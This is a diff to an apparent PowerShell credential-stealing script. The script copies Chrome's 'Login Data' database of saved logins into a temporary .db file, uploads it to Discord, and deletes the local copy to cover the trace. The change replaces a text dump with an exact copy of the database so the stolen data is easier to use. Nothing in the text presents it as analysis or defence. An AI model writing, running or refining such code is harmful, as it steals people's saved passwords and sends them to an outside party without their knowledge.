@@ -18,11 +18,11 @@ function Send-DiscordMessage {
     }
 }
 
-# Function to extract encoded passwords (raw data) from Chrome Login Data
-function Extract-RawEncodedPasswords {
+# Function to extract raw encoded passwords and save to a new SQLite .db file
+function Extract-And-ExportToDB {
     param (
         [string]$chromeLoginDataPath,
-        [string]$outputFilePath
+        [string]$outputDbPath
     )
 
     # Check if the Login Data file exists
@@ -34,13 +34,12 @@ function Extract-RawEncodedPasswords {
     try {
         # Open the Login Data file as binary data (it is an SQLite DB)
         $fileBytes = [System.IO.File]::ReadAllBytes($chromeLoginDataPath)
-        $rawData = [System.Text.Encoding]::ASCII.GetString($fileBytes)
 
-        # Write the raw data to a text file
-        $rawData | Out-File -FilePath $outputFilePath
-        Write-Host "Raw encoded data saved to: $outputFilePath"
+        # Write the raw data to the new SQLite DB file
+        [System.IO.File]::WriteAllBytes($outputDbPath, $fileBytes)
+        Write-Host "Raw encoded data exported to SQLite DB file: $outputDbPath"
     } catch {
-        Write-Host "Error extracting raw encoded passwords: $_"
+        Write-Host "Error extracting and exporting data: $_"
     }
 }
 
@@ -86,14 +85,14 @@ if (-not (Test-Path $loginDataPath)) {
     exit
 }
 
-# Define the output path for the password file
-$outputFile = "$env:TEMP\chrome_passwords.txt"
+# Define the output path for the restored SQLite DB
+$outputDbFile = "$env:TEMP\chrome_login_data.db"
 
-# Extract the raw encoded passwords from Chrome's Login Data
-Extract-RawEncodedPasswords -chromeLoginDataPath $loginDataPath -outputFilePath $outputFile
+# Extract and export the raw encoded passwords (and database structure) to a new .db file
+Extract-And-ExportToDB -chromeLoginDataPath $loginDataPath -outputDbPath $outputDbFile
 
-# Upload the .txt file containing raw encoded passwords to Discord
-Upload-FileToDiscord -filePath $outputFile
+# Upload the restored SQLite DB file to Discord
+Upload-FileToDiscord -filePath $outputDbFile
 
-# Optionally, remove the .txt file after uploading
-Remove-Item $outputFile
+# Optionally, remove the .db file after uploading
+Remove-Item $outputDbFile
